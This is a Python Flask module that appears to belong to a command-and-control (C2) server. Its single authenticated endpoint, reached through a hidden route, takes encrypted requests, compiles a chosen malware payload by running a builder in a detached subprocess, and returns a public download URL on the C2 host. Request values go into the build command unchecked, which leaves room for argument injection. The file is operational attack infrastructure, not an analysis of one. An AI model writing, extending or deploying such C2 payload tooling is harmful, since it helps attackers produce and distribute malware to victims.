# payload.py

from flask import Blueprint, render_template, request, jsonify
from flask_login import login_required
import json
from . import db, config, decrypt, encrypt, current_dir
import time
import subprocess
import shlex
import binascii

payload = Blueprint('payload', __name__)


# create payload - generate - compile
@payload.route(config["hidden_route"] + config["endpoints"]["payload"], methods=['POST'])
@login_required
def generate_payload():
    try:
        content = request.data
        d = decrypt(content)
    except Exception as e:
        print("[-] Error in generate_payload()")
        print(str(e))
        return encrypt("[-] Cannot decrypt the request")

    d = json.loads(d)

    payload_name = d["payload_name"]
    payload_builder = current_dir + config["payload"]["details"][payload_name]["builder"]
    params = config["payload"]["details"][payload_name]["parameters"]
    source_code = current_dir + config["payload"]["details"][payload_name]["source_code"]
    c = payload_builder
    for p in params:
        c += " " + d[p]
    c += " " + source_code
        
    cc = shlex.split(c)
    subprocess.Popen(cc, start_new_session=True)

    location_download = config["mjollnir_c2_url"] + config["endpoints"]["public_download"] + "/" + d["OUTPUT_FILENAME"]
    return encrypt("[+] Payload created. Publicly downloadable at: " + location_download)


